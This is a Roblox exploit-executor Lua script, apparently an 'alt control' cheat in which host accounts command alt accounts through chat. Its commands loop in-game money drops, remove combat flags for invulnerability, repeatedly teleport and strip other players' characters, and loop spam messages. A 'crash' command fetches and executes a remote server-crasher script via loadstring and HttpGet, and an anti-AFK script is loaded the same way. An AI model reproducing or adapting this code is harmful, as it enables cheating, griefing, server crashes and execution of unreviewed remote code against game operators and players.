-- This kid is a scammer, scammed me smh.

getgenv().Settings = {
    Host = {"HostName","HostName2"},
    Prefix = ".",
    FPS_CAP = 3,
}
getgenv().Alts = {
    Alt1 = "Alt1",
    Alt2 = "Alt2",
    Alt2 = "Alt3",
}

-- This is not deobfuscated, it was minified then beautified to prevent kids skidding ;))

if not game:IsLoaded() then
    game.Loaded:Wait()
end
local a = game.Players.LocalPlayer
local b = false
getgenv().IncomingSpeicalKey =
    "AAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCC_sike_kameaweaorjaiwrjaraornaoraorwrarnawrnaowrawornaornawonraornawoirawoiraur349324uinraonr__rwqroubqir"
if table.find(Settings["Host"], a.Name) then
    b = true
else
    setfpscap(Settings["FPS_CAP"])
    local c = Instance.new("ScreenGui")
    local d = Instance.new("Frame")
    local e = Instance.new("TextLabel")
    local f = Instance.new("TextLabel")
    c.Name = "AltControl"
    c.Parent = game.CoreGui
    c.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    d.Parent = c
    d.AnchorPoint = Vector2.new(0.5, 0.5)
    d.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    d.BorderColor3 = Color3.fromRGB(0, 0, 0)
    d.BorderSizePixel = 100
    d.Position = UDim2.new(0.5, 0, 0.5, 0)
    d.Size = UDim2.new(1, 0, 1, 0)
    e.Parent = d
    e.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    e.BackgroundTransparency = 1.000
    e.Position = UDim2.new(0.437655866, 0, 0.380451113, 0)
    e.Size = UDim2.new(0, 200, 0, 50)
    e.Font = Enum.Font.SourceSans
    e.Text = "3D rendering off"
    e.TextColor3 = Color3.fromRGB(255, 255, 255)
    e.TextSize = 50.000
    f.Parent = d
    f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    f.BackgroundTransparency = 1.000
    f.Position = UDim2.new(0.437655866, 0, 0.455639064, 0)
    f.Size = UDim2.new(0, 200, 0, 50)
    f.Font = Enum.Font.SourceSans
    f.Text = "Name"
    f.TextColor3 = Color3.fromRGB(255, 255, 255)
    f.TextSize = 50.000
    local function g()
        local h = Instance.new("LocalScript", f)
        h.Parent.Text = game.Players.LocalPlayer.Name
    end
    coroutine.wrap(g)()
end
local function i(j, k)
    if k == true then
        if string.lower(j) == "float" then
            game.Workspace.Gravity = 0
        end
    end
end
local l = {
    OriginalGravity = 196.19999694824,
    Dropping = false,
    Blocking = false,
    LoopMsg = false,
    Floating = false,
    msg_loop = "joe"
}
local function m(n)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(n, "All")
end
local o = {
    Bank = {
        "-388,21,-336",
        "-388,21,-327",
        "-388,21,-318",
        "-388,21,-309",
        "-388,21,-300",
        "-388,21,-291",
        "-388,21,-282",
        "-388,21,-273",
        "-388,21,-264",
        "-388,21,-255",
        "-388,21,-246",
        "-388,21,-237",
        "-388,21,-228",
        "-375,21,-336",
        "-375,21,-327",
        "-375,21,-318",
        "-375,21,-309",
        "-375,21,-300",
        "-375,21,-291",
        "-375,21,-282",
        "-375,21,-273",
        "-375,21,-264",
        "-375,21,-255",
        "-375,21,-246",
        "-375,21,-237",
        "-375,21,-228",
        "-360,21,-336",
        "-360,21,-327",
        "-360,21,-318",
        "-360,21,-309",
        "-360,21,-300",
        "-360,21,-291",
        "-360,21,-282",
        "-360,21,-273",
        "-360,21,-264",
        "-360,21,-255",
        "-360,21,-246",
        "-360,21,-237",
        "-360,21,-228"
    },
    Court = {
        "-871,21,-448",
        "-882,21,-448",
        "-893,21,-448",
        "-904,21,-448",
        "-915,21,-448",
        "-926,21,-448",
        "-937,21,-448",
        "-948,21,-448",
        "-959,21,-448",
        "-970,21,-448",
        "-981,21,-448",
        "-992,21,-448",
        "-871,21,-482",
        "-882,21,-482",
        "-893,21,-482",
        "-904,21,-482",
        "-915,21,-482",
        "-926,21,-482",
        "-937,21,-482",
        "-948,21,-482",
        "-959,21,-482",
        "-970,21,-482",
        "-981,21,-482",
        "-992,21,-482",
        "-871,21,-518",
        "-882,21,-518",
        "-893,21,-518",
        "-904,21,-518",
        "-915,21,-518",
        "-926,21,-518",
        "-937,21,-518",
        "-948,21,-518",
        "-959,21,-518",
        "-970,21,-518",
        "-981,21,-518",
        "-992,21,-518",
        "-933,22,-505",
        "-933,22,-459",
        "-896,21,-436"
    },
    Club = {
        "-282,-7,-348",
        "-274,-7,-348",
        "-266,-7,-348",
        "-258,-7,-348",
        "-250,-7,-348",
        "-282,-7,-357",
        "-274,-7,-357",
        "-266,-7,-357",
        "-258,-7,-357",
        "-250,-7,-357",
        "-282,-7,-362",
        "-274,-7,-362",
        "-266,-7,-362",
        "-258,-7,-362",
        "-250,-7,-362",
        "-282,-7,-367",
        "-274,-7,-367",
        "-266,-7,-367",
        "-258,-7,-367",
        "-250,-7,-367",
        "-282,-7,-372",
        "-274,-7,-372",
        "-266,-7,-372",
        "-258,-7,-372",
        "-250,-7,-372",
        "-282,-7,-377",
        "-274,-7,-377",
        "-266,-7,-377",
        "-258,-7,-377",
        "-250,-7,-377",
        "-282,-7,-382",
        "-274,-7,-382",
        "-266,-7,-382",
        "-258,-7,-382",
        "-250,-7,-382",
        "-248,0,-342",
        "-260,0,-341",
        "-271,0,-341",
        "-281,0,-341"
    },
    Admin = {
        "-826,-40,-617",
        "-826,-40,-605",
        "-826,-40,-593",
        "-826,-40,-581",
        "-826,-40,-569",
        "-826,-40,-557",
        "-845,-40,-617",
        "-845,-40,-605",
        "-845,-40,-593",
        "-845,-40,-581",
        "-845,-40,-569",
        "-845,-40,-557",
        "-864,-40,-617",
        "-864,-40,-605",
        "-864,-40,-593",
        "-864,-40,-581",
        "-864,-40,-569",
        "-864,-40,-557",
        "-879,-40,-617",
        "-879,-40,-605",
        "-879,-40,-593",
        "-879,-40,-581",
        "-879,-40,-569",
        "-879,-40,-557",
        "-898,-40,-617",
        "-898,-40,-605",
        "-898,-40,-593",
        "-898,-40,-581",
        "-898,-40,-569",
        "-898,-40,-557",
        "-918,-40,-617",
        "-918,-40,-605",
        "-918,-40,-593",
        "-918,-40,-581",
        "-918,-40,-569",
        "-918,-40,-557",
        "-816,-33,-643",
        "-927,-33,-642",
        "-873,-33,-521"
    }
}
game:GetService("RunService").Stepped:Connect(
    function()
        if l["Dropping"] == true then
            game.ReplicatedStorage.MainEvent:FireServer("DropMoney", 10000)
        end
        if l["Blocking"] == true then
            game.ReplicatedStorage.MainEvent:FireServer("Block", true)
        end
        if l["Floating"] == true then
            game.Workspace.Gravity = 0
        end
    end
)
coroutine.resume(
    coroutine.create(
        function()
            while wait(10) do
                if l["LoopMsg"] == true then
                    m(l["msg_loop"])
                end
            end
        end
    )
)
local function p(n, q)
    if b == false or table.find(Settings["Host"], game.Players:GetPlayerByUserId(q).Name) then
        if n == Settings["Prefix"] .. "bring" then
            if not b then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    game.Players:GetPlayerByUserId(q).Character.HumanoidRootPart.CFrame.X,
                    game.Players:GetPlayerByUserId(q).Character.HumanoidRootPart.CFrame.Y,
                    game.Players:GetPlayerByUserId(q).Character.HumanoidRootPart.CFrame.Z + 5
                )
            end
        elseif n == Settings["Prefix"] .. "freeze" then
            if not b then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            end
        elseif n == Settings["Prefix"] .. "unfreeze" then
            if not b then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            end
        elseif n == Settings["Prefix"] .. "hide" then
            if not b then
                for r, s in pairs(workspace:GetChildren()) do
                    if s.Name == "1_Part_1" then
                        s:Destroy()
                    end
                end
                local t = Instance.new("Part", workspace)
                t.Name = "1_Part_1"
                t.Transparency = 1
                t.CFrame =
                    CFrame.new(
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y - 11,
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
                )
                t.Anchored = true
                t.Size = Vector3.new(t.Size.X + 50, t.Size.Y + 1, t.Size.Z + 50)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y - 10,
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
                )
                wait(2.5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            end
        elseif n == Settings["Prefix"] .. "unhide" then
            if not b then
                wait(0.5)
                for r = 1, 7 do
                    wait()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y + 10,
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
                    )
                end
                for r, s in pairs(workspace:GetChildren()) do
                    if s.Name == "1_Part_1" then
                        s:Destroy()
                    end
                end
            end
        elseif n == Settings["Prefix"] .. "drop" then
            if not b then
                l["Dropping"] = true
                game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Character
                l["Blocking"] = true
            end
        elseif n == Settings["Prefix"] .. "stop" then
            if not b then
                l["Dropping"] = false
                l["Blocking"] = false
                game.Players.LocalPlayer.Character:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Backpack
                for r = 1, 10 do
                    game.ReplicatedStorage.MainEvent:FireServer("Block", false)
                    wait()
                end
            end
        elseif n == Settings["Prefix"] .. "wal" then
            if not b then
                game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Character
            end
        elseif n == Settings["Prefix"] .. "unwal" then
            if not b then
                game.Players.LocalPlayer.Character:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Backpack
            end
        elseif n == Settings["Prefix"] .. "block" then
            if not b then
                l["Blocking"] = true
            end
        elseif n == Settings["Prefix"] .. "unblock" then
            if not b then
                l["Blocking"] = false
                for r = 1, 10 do
                    game.ReplicatedStorage.MainEvent:FireServer("Block", false)
                    wait()
                end
            end
        elseif n == Settings["Prefix"] .. "god" then
            if not b then
                if game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild("Attacking") then
                    game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild("Attacking"):Destroy(

                    )
                end
            end
        elseif n == Settings["Prefix"] .. "crash" then
            if not b then
                loadstring(
                    game:HttpGet(
                        "https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher"
                    )
                )()
            end
        elseif n == Settings["Prefix"] .. "unad" then
            if not b then
                l["LoopMsg"] = false
            end
        elseif n == Settings["Prefix"] .. "group" then
            if not b then
                pcall(
                    function()
                        coroutine.resume(
                            coroutine.create(
                                function()
                                    while wait(0.01) do
                                        for r, s in pairs(game.Players:GetChildren()) do
                                            if s.Name ~= game.Players.LocalPlayer.Name then
                                                s.Character.HumanoidRootPart.CFrame = CFrame.new(274, 28, -1084)
                                            end
                                        end
                                    end
                                end
                            )
                        )
                        for r, s in pairs(game.Players:GetChildren()) do
                            if s.Name ~= game.Players.LocalPlayer.Name then
                                for u, v in pairs(s.Character:GetChildren()) do
                                    if
                                        v:IsA("MeshPart") or v:IsA("Accessory") or s.Name == "Humanoid" or
                                            s.Name == "HumanoidRootPart"
                                     then
                                        v:Destroy()
                                    end
                                end
                            end
                        end
                    end
                )
                local w =
                    CFrame.new(
                    game.Players:GetPlayerByUserId(q).Character.HumanoidRootPart.CFrame.X - 5,
                    game.Players:GetPlayerByUserId(q).Character.HumanoidRootPart.CFrame.Y,
                    game.Players:GetPlayerByUserId(q).Character.HumanoidRootPart.CFrame.Z + 5
                )
                local x = math.random(4, 6)
                for r = 1, 10 do
                    a.Character.HumanoidRootPart.CFrame = w
                    if r == x then
                        a.Character.HumanoidRootPart.Anchored = true
                    end
                    wait()
                end
            end
        elseif n == Settings["Prefix"] .. "ungroup" then
            if not b then
                for r = 1, 10 do
                    a.Character.HumanoidRootPart.Anchored = false
                    wait()
                end
            end
        elseif n == Settings["Prefix"] .. "float" then
            if not b then
                l["Floating"] = true
                local w =
                    CFrame.new(
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y + 10,
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z
                )
                setfpscap(30)
                for r = 1, 10 do
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = w
                    wait()
                end
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                setfpscap(Settings["FPS_CAP"])
                for r, s in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                    if s:IsA("AnimationTrack") and s.Name == "FallAnim" then
                        s:Destroy()
                    end
                end
            end
        elseif n == Settings["Prefix"] .. "unfloat" then
            if not b then
                l["Floating"] = false
                for r = 1, 10 do
                    a.Character.HumanoidRootPart.Anchored = false
                    wait()
                end
                for r, s in pairs(workspace:GetChildren()) do
                    if s.Name == "2_Part_2" then
                        s:Destroy()
                    end
                end
            end
        elseif n == Settings["Prefix"] .. "vibe" then
            if not b then
                local y = Instance.new("Folder", game.Workspace)
                local z = Instance.new("Animation", y)
                z.AnimationId = "rbxassetid://3189773368"
                local A = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(z)
                A:Play()
            end
        elseif n == Settings["Prefix"] .. "unvibe" then
            if not b then
                for r, s in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                    if s.Name == "Animation" or s.Name == "Animation1" then
                        s:Stop()
                    end
                end
            end
        elseif n == Settings["Prefix"] .. "reset" then
            if not b then
                for r, s in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if s:IsA("MeshPart") or s.Name == "HumanoidRootPart" or s.Name == "Humanoid" then
                        s:Destroy()
                    end
                end
            end
        elseif n == Settings["Prefix"] .. "mask" then
            if not b then
                local B = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                local C = game.Workspace.Ignored.Shop["[Surgeon Mask] - $25"]
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = C.Head.CFrame + Vector3.new(0, 3, 0)
                if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - C.Head.Position).Magnitude <= 50 then
                    wait(.2)
                    fireclickdetector(C:FindFirstChild("ClickDetector"), 4)
                    toolf = game.Players.LocalPlayer.Backpack:WaitForChild("Mask")
                    toolf.Parent = game.Players.LocalPlayer.Character
                    wait()
                    game.Players.LocalPlayer.Character:WaitForChild("Mask")
                    game:GetService("VirtualUser"):ClickButton1(Vector2.new())
                    game.Players.LocalPlayer.Character:WaitForChild("In-gameMask")
                    game.Players.LocalPlayer.Character["In-gameMask"].Handle:Destroy()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(B)
                end
            end
        end
        n = string.split(n, " ")
        if n[1] and n[2] then
            if n[1] == Settings["Prefix"] .. "say" then
                if not b then
                    local D, E =
                        pcall(
                        function()
                            local F = ""
                            local G = {}
                            for r, s in pairs(n) do
                                table.insert(G, s)
                            end
                            table.remove(G, 1)
                            function getTableCnt(H)
                                local I = 0
                                for r, s in pairs(H) do
                                    I = I + 1
                                end
                                return I
                            end
                            local J = 0
                            for r, s in pairs(G) do
                                J = J + 1
                                if getTableCnt(G) ~= J then
                                    F = F .. "" .. s .. " "
                                else
                                    F = F .. "" .. s
                                end
                            end
                            m(F)
                        end
                    )
                end
            elseif n[1] == Settings["Prefix"] .. "ad" then
                if not b then
                    local D, E =
                        pcall(
                        function()
                            local F = ""
                            local G = {}
                            for r, s in pairs(n) do
                                table.insert(G, s)
                            end
                            table.remove(G, 1)
                            function getTableCnt(H)
                                local I = 0
                                for r, s in pairs(H) do
                                    I = I + 1
                                end
                                return I
                            end
                            local J = 0
                            for r, s in pairs(G) do
                                J = J + 1
                                if getTableCnt(G) ~= J then
                                    F = F .. "" .. s .. " "
                                else
                                    F = F .. "" .. s
                                end
                            end
                            l["LoopMsg"] = true
                            l["msg_loop"] = F
                        end
                    )
                end
            elseif n[1] == Settings["Prefix"] .. "fps" then
                if not b then
                    setfpscap(tonumber(n[2]))
                end
            elseif n[1] == Settings["Prefix"] .. "setup" then
                if not b then
                    if a.Character.HumanoidRootPart.Anchored == true then
                        a.Character.HumanoidRootPart.Anchored = false
                    end
                    local function K()
                        local L = {}
                        local function M(N)
                            for r, s in pairs(game.Players:GetChildren()) do
                                if s.Name == N then
                                    return true
                                end
                            end
                            return false
                        end
                        for r, s in pairs(Alts) do
                            if M(s) == true then
                                table.insert(L, tostring(s))
                            end
                        end
                        return L
                    end
                    local O = 0
                    local P = K()
                    local function Q(R)
                        local S = o[R][O]
                        local T, U, V = string.split(S, ",")[1], string.split(S, ",")[2], string.split(S, ",")[3]
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(T, U, V)
                    end
                    local function W()
                        O = O + 1
                    end
                    local X = {admin = "Admin", court = "Court", club = "Club", bank = "Bank"}
                    local Y = X[string.lower(n[2])]
                    for r, s in pairs(P) do
                        if s == a.Name then
                            W()
                            Q(Y)
                        else
                            W()
                        end
                    end
                end
            end
        end
    end
end
game.Players.PlayerAdded:Connect(
    function(q)
        if table.find(Settings["Host"], q.Name) then
            q.Chatted:Connect(
                function(n)
                    p(n, q.UserId)
                end
            )
        end
    end
)
for Z, q in pairs(game.Players:GetChildren()) do
    if table.find(Settings["Host"], q.Name) then
        q.Chatted:Connect(
            function(n)
                p(n, q.UserId)
            end
        )
    end
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/grandpascripts/error502/main/AntiAfk.lua"))()
game.StarterGui:SetCore("SendNotification", {Title = "Alt Control!", Text = "Executed!", Duration = 10})
